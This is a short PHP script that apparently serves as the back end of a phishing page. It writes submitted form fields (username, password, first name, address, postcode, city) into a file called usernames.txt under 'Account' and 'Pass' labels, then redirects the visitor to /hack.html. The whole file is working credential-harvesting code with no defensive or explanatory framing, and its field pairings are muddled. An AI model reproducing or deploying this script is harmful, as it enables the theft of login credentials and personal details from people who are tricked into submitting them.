<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . " Pass: " . $_POST['Prenom'] . "\n", FILE_APPEND);
header('Location: /hack.html');


file_put_contents("usernames.txt", "Account: " . $_POST['password'] . " Pass: " . $_POST['adresse'] . "\n", FILE_APPEND);
header('Location: /hack.html');


file_put_contents("usernames.txt", "Account: " . $_POST['cp'] . " Pass: " . $_POST['ville'] . "\n", FILE_APPEND);
header('Location: /hack.html');
exit();
